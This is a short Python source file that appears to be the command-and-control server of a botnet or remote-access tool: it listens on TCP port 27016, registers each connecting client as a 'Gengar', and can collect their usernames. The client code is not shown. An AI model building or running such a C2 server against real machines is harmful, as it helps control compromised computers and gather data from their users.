import socket
import threading

from gengar import Gengar


class CNCServer:
    _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    gengars = []

    def __init__(self):
        self._sock.bind(('0.0.0.0', 27016))

    def listen(self):
        self._sock.listen(1)
        print('Waiting for connections.')
        accept_worker = threading.Thread(target=self._accept, daemon=True)
        accept_worker.start()

    def _accept(self):
        while True:
            conn, (ip, port) = self._sock.accept()
            print(f'Gengar spawned at {ip}')
            self.gengars.append(Gengar(conn))

    def close(self):
        self._sock.close()

    def fetch_usernames(self):
        return [gengar.username() for gengar in self.gengars]
